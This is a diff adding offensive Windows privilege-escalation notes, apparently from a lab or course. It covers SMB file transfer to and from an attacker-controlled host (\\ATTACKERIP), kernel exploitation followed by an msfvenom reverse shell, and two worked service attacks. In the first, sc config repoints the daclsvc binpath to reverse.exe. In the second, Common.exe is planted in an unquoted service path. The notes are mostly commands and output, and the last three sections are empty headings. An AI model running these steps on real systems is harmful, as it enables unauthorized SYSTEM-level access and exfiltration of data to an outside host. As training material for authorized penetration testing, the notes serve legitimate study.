@@ -1,0 +1,81 @@
+File Transfer from Remote Machine to Attacker Machine via SMB:
+On Attacker Machine run:
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py DIRECTORYTOMOUNT .
+On Remote Machine run: 
+fileonremotemachine.txt > \\ATTACKERIP\DIRECTORYMOUNTED\fileonremotemachine.txt
+
+File Transfer from Attacker Machine to Remote Machine via SMB:
+On Remote Machine run:
+copy \\ATTACKERIP\DIRECTORYMOUNTED\fileonattackermachine.txt . 
+
+Kernal Exploits
+  1. Enumerate Windows versions / patch level (systeminfo)
+  2. Find matching exploits (Google, ExploitDB, Github)
+  3. Compile and run
+  Kernel exploits can be unstable and can cause the system to crash, so use as last resort.
+  TIP!!!
+    You can use wesng tool to first check for kenel exploits
+    1. Run the systeminfo command and send the info to your attacker machine, then run wesng on that textfile
+    2. Precompiled Kernel Exploits can be found https://github.com/SecWiki/windows-kernel-exploits
+      a. It's easier to match with this than to compile your own.
+  EXAMPLE!!!
+    CVE-2018-8120 kernel exploit can run any program. You can run reverse.exe created by msfvenom for a reverse shell
+ 
+ Service Exploits
+  Query the config of a service
+    > sc.exe qc <name>
+  Query the current status of a service
+    > sc.exe query <name>
+  Modify a config option of a service
+    > sc.exe config <name> <option>= <value>
+  Start/Stop a service:
+    > net start/stop <name>
+   
+   5 Types of Service Misconfigurations
+   
+   1. Insecure Service Properties
+      a. Each service has an ACL which defines certain service-specific permissions
+      b. Some permissions are harmless (ex.SERVICE_QUERY_CONFIG, SERVICE_QUERY_STATUS)
+      c. Some are useful (ex. SERVICE_STOP, SERVICE_START)
+      d. Some are dangerous (ex. SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS)
+      If our user has permission to change the config of a service which runs with SYSTEM privileges, we can change the executable the service uses to one of our own.
+      accesschk.exe can check if a user can start and stop a service 
+      EXAMPLE!!! ("user" checking the "daclsvc" service)
+      1. Run winPEASany.exe on the system and found daclsvc was writable
+      2. .\accesschk.exe /accepteula -uwcqv user daclsvc (this will help check permissions on the file)
+      SERVICE_START
+      SERVICE_STOP
+      3. Next query the service 
+      sc qc daclsvc
+      "DEMAND_START" means to manually start the service
+      4. Check status of service 
+      sc query daclsvc
+      5. Change the config to a payload of our own, probably a reverse shell
+      sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
+      TIP!!!
+      If you can change a service config, but cannot stop/start it, you may not be able to escalate privileges
+   2. Unquoted Service Path
+      a. Windows will check if there are quotes on the service and run the filepath as arguments. We can take advantage of this.
+      EXAMPLE!!!
+      1. run winPEASany.exe on the system and found C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+      2. run .\accesschk.exe /accepteula -ucqv unquotedsvc (this will help check permissions on the file)
+      SERVICE_START
+      SERVICE_STOP
+      3. run accesschk on each directory to find writable permissions
+      .\accesschk.exe /accepteula -uwdq C:\
+        RW BUILTIN\Administrators
+        RW NT AUTHORITY\SYSTEM
+      .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
+        RW BUILTIN\Administrators
+        RW NT AUTHORITY\SYSTEM
+      .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+        RW BUILTIN\Administrators
+        RW NT AUTHORITY\SYSTEM
+        RW BUILTIN\Users  (We are apart of this group as a normal user!!!)
+       4. The next folder for this service is "\Common Files\", so we will make a reverse shell named "Common.exe" since Windows will check for "Common" as the next arg
+       copy reverse.exe "C:\PRogram Files\Unoquoted Path Service\Common.exe"
+       5. Start the service
+       net start unquotedsvc
+   3. Weak Registry Permissions
+   4. Insecure Service Executables
+   5. DLL Hijacking
